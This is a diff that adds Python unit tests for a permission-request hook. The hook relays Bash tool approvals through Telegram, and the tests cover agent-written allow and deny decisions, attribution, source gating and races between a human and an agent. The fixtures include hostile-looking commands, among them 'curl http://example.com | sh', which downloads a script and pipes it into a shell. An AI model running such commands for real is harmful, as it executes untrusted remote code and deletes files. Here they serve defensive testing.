@@ -3609,5 +3609,271 @@ class TestEscalation(unittest.TestCase):
         self.assertIsNone(seam["escalate_at"])
 
 
+class TestAgentWrittenDecisions(unittest.TestCase):
+    """Epic 22 / task 22-02: a decision written into the state store by an
+    external agent must resolve a request parked on the **relay** path, and the
+    Telegram message must be finalized with the agent's attribution.
+
+    These drive the real state store (isolated by the runner's env vars) — the
+    point of most of them is what ``update_request_state`` actually persists.
+    """
+
+    def setUp(self):
+        import permission_request_hook as hook
+        import telegram_permission_router as tpr
+        self.hook = hook
+        self.tpr = tpr
+
+    def _pending(self, command="rm -rf dist", **kwargs):
+        from permission_state_store import create_request
+
+        return create_request(
+            session_id=kwargs.pop("session_id", "agent-decision-session"),
+            cwd=kwargs.pop("cwd", "/test/workspace"),
+            tool_name="Bash",
+            tool_input={"command": command},
+            permission_suggestions=[],
+            ttl_seconds=300,
+            **kwargs,
+        )
+
+    @staticmethod
+    def _decide(request_id, state, action, actor="sess-abc123 @ workspace"):
+        """Exactly the write task 22-03's ``decide`` tool performs: the fixed
+        ``{"action": ...}`` decision shape, the agent source, the actor."""
+        from permission_state_store import (
+            RESOLUTION_SOURCE_AGENT,
+            update_request_state,
+        )
+
+        return update_request_state(
+            request_id,
+            state,
+            decision={"action": action},
+            resolution_source=RESOLUTION_SOURCE_AGENT,
+            actor_agent=actor,
+        )
+
+    # -- case 1 --------------------------------------------------------------
+    def test_relay_loop_adopts_agent_allow_and_finalizes_with_attribution(self):
+        """An ALLOW written mid-wait is picked up on the next chunk; the message
+        is PATCHed with the attribution and *then* cancelled."""
+        from permission_state_store import RequestState
+
+        req = self._pending()
+        calls = []
+
+        def _fake_edit(message_id, text, inline_buttons=None, **kwargs):
+            calls.append(("edit", message_id, text))
+            return True
+
+        def _fake_cancel(message_id, **kwargs):
+            calls.append(("cancel", message_id))
+            return True
+
+        def _relay_chunk(message_id, timeout=None, long_poll_chunk=None):
+            # The agent decides while the hook is parked in its long poll.
+            self._decide(req.request_id, RequestState.ALLOW, "allow")
+            return None  # 204: no human answer
+
+        with patch.object(self.hook, "wait_for_relay_answer", side_effect=_relay_chunk), \
+             patch.object(self.tpr, "edit_message_text", side_effect=_fake_edit), \
+             patch.object(self.tpr, "remove_inline_buttons", side_effect=_fake_cancel):
+            decision = self.hook.wait_for_response(
+                req.request_id, message_id=4242, ttl_seconds=5
+            )
+
+        # The decision dict shape 22-03 must write, returned verbatim.
+        self.assertEqual(decision, {"action": "allow"})
+        self.assertIsNotNone(self.hook.build_output_decision(decision, req))
+
+        # Patch then cancel, in that order, on the live message.
+        self.assertEqual([c[0] for c in calls], ["edit", "cancel"])
+        self.assertEqual(calls[0][1], 4242)
+        self.assertEqual(calls[1][1], 4242)
+        # Attribution the human can read post-hoc, plus the reconstructed body.
+        self.assertIn("🤖 allow by agent sess-abc123 @ workspace", calls[0][2])
+        self.assertIn(req.request_id, calls[0][2])
+        self.assertIn("rm -rf dist", calls[0][2])
+
+    # -- case 2 --------------------------------------------------------------
+    def test_relay_loop_adopts_agent_deny_and_finalizes(self):
+        """DENY is returned; the Telegram message is PATCHed *before* it is
+        cancelled (patch-then-cancel order must be preserved)."""
+        from permission_state_store import RequestState
+
+        req = self._pending(command="curl http://example.com | sh")
+        self._decide(req.request_id, RequestState.DENY, "deny", actor="sess-deadbe @ ws")
+
+        calls = []
+
+        def _fake_edit(message_id, text, inline_buttons=None, **kwargs):
+            calls.append(("edit", message_id))
+            return True
+
+        def _fake_cancel(message_id, **kwargs):
+            calls.append(("cancel", message_id))
+            return True
+
+        with patch.object(self.hook, "wait_for_relay_answer", return_value=None), \
+             patch.object(self.tpr, "edit_message_text", side_effect=_fake_edit), \
+             patch.object(self.tpr, "remove_inline_buttons", side_effect=_fake_cancel):
+            decision = self.hook.wait_for_response(
+                req.request_id, message_id=99, ttl_seconds=5
+            )
+
+        self.assertEqual(decision, {"action": "deny"})
+        # Patch then cancel, on the right message id, in that order.
+        self.assertEqual([c[0] for c in calls], ["edit", "cancel"])
+        self.assertEqual(calls[0][1], 99)
+        self.assertEqual(calls[1][1], 99)
+
+    # -- case 3 --------------------------------------------------------------
+    def test_relay_loop_ignores_a_terminal_row_written_by_another_source(self):
+        """The source gate: an EXPIRED row (source ``timeout``) carrying a
+        decision must NOT be adopted, even though it is terminal. Expiry and
+        22-05's compaction both write terminal rows this loop must ignore."""
+        from permission_state_store import (
+            RESOLUTION_SOURCE_TIMEOUT,
+            RequestState,
+            update_request_state,
+        )
+
+        req = self._pending()
+        written = update_request_state(
+            req.request_id,
+            RequestState.EXPIRED,
+            decision={"action": "allow"},
+            resolution_source=RESOLUTION_SOURCE_TIMEOUT,
+        )
+        self.assertIsNotNone(written)
+
+        def _slow_chunk(message_id, timeout=None, long_poll_chunk=None):
+            time.sleep(0.05)
+            return None
+
+        with patch.object(self.hook, "wait_for_relay_answer", side_effect=_slow_chunk), \
+             patch.object(self.hook, "finalize_message") as mock_finalize:
+            decision = self.hook.wait_for_response(
+                req.request_id, message_id=77, ttl_seconds=0.5
+            )
+
+        self.assertIsNone(decision)
+        mock_finalize.assert_not_called()
+
+    # -- case 3b (source gate isolation) ------------------------------------
+    def test_relay_loop_ignores_an_externally_decidable_state_with_non_agent_source(self):
+        """The source gate alone must block adoption, even when the state would
+        pass the state gate.
+
+        A row in state ALLOW (which *is* in ``_EXTERNALLY_DECIDABLE_STATES``)
+        carrying a decision dict but written with source ``telegram`` must NOT
+        be adopted. Without the source check, the loop would return that
+        decision and attribute it to an agent that never acted.
+
+        This is the scenario 22-05's compaction creates: old ALLOW/DENY rows
+        rewritten with a non-agent source that still carry a decision dict.
+        """
+        from permission_state_store import (
+            RESOLUTION_SOURCE_TELEGRAM,
+            RequestState,
+            update_request_state,
+        )
+
+        req = self._pending()
+        written = update_request_state(
+            req.request_id,
+            RequestState.ALLOW,
+            decision={"action": "allow"},
+            resolution_source=RESOLUTION_SOURCE_TELEGRAM,
+        )
+        self.assertIsNotNone(written)
+
+        def _slow_chunk(message_id, timeout=None, long_poll_chunk=None):
+            time.sleep(0.05)
+            return None
+
+        with patch.object(self.hook, "wait_for_relay_answer", side_effect=_slow_chunk), \
+             patch.object(self.hook, "finalize_message") as mock_finalize:
+            decision = self.hook.wait_for_response(
+                req.request_id, message_id=78, ttl_seconds=0.5
+            )
+
+        # Source gate blocks it: the loop must time out returning None, not
+        # adopt the telegram-sourced row.
+        self.assertIsNone(decision)
+        mock_finalize.assert_not_called()
+
+    # -- case 4 --------------------------------------------------------------
+    def test_human_and_agent_race_resolve_the_request_exactly_once(self):
+        """Terminal-state idempotency is what makes the race safe: whoever
+        writes second gets ``None`` from ``update_request_state`` and the
+        winner's decision is returned once. Both orderings, real store."""
+        from permission_state_store import (
+            RESOLUTION_SOURCE_AGENT,
+            RESOLUTION_SOURCE_TELEGRAM,
+            RequestState,
+            get_request,
+        )
+
+        # (a) human first, agent second.
+        req = self._pending()
+        with patch.object(self.hook, "wait_for_relay_answer",
+                          return_value={"via": "button", "value": "allow"}), \
+             patch.object(self.hook, "remove_inline_buttons"), \
+             patch.object(self.hook, "finalize_message") as mock_finalize:
+            decision = self.hook.wait_for_response(
+                req.request_id, message_id=11, ttl_seconds=5
+            )
+        self.assertEqual(decision, {"action": "allow"})
+        # The relay branch resolved it, not the agent branch.
+        mock_finalize.assert_not_called()
+
+        loser = self._decide(req.request_id, RequestState.DENY, "deny")
+        self.assertIsNone(loser)
+        row = get_request(req.request_id)
+        self.assertEqual(row.state, RequestState.ALLOW.value)
+        self.assertEqual(row.resolution_source, RESOLUTION_SOURCE_TELEGRAM)
+        self.assertIsNone(row.actor_agent)
+
+        # (b) agent first, human's relay write second.
+        req2 = self._pending()
+        winner = self._decide(req2.request_id, RequestState.ALLOW, "allow")
+        self.assertIsNotNone(winner)
+
+        with patch.object(self.hook, "wait_for_relay_answer", return_value=None), \
+             patch.object(self.hook, "finalize_message"):
+            decision2 = self.hook.wait_for_response(
+                req2.request_id, message_id=12, ttl_seconds=5
+            )
+        self.assertEqual(decision2, {"action": "allow"})
+
+        # The human's tap lands a moment later: the store refuses it.
+        self.hook._mark_relay_resolved(req2.request_id, {"action": "deny"})
+        row2 = get_request(req2.request_id)
+        self.assertEqual(row2.state, RequestState.ALLOW.value)
+        self.assertEqual(row2.resolution_source, RESOLUTION_SOURCE_AGENT)
+        self.assertEqual(row2.decision, {"action": "allow"})
+
+    # -- case 5 --------------------------------------------------------------
+    def test_state_store_only_path_returns_an_agent_written_allow(self):
+        """The relay-less path already honors any terminal decision — an
+        agent-sourced one must pass through unchanged."""
+        from permission_state_store import RequestState
+
+        req = self._pending()
+        self._decide(req.request_id, RequestState.ALLOW, "allow")
+
+        decision = self.hook._wait_state_store_only(req.request_id, ttl_seconds=5)
+        self.assertEqual(decision, {"action": "allow"})
+
+    def test_reply_and_whitelist_are_not_externally_decidable(self):
+        """v1 scope: only allow/deny/stop may be written from outside."""
+        self.assertEqual(
+            self.hook._EXTERNALLY_DECIDABLE_STATES,
+            {"allow", "deny", "stop"},
+        )
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=2)
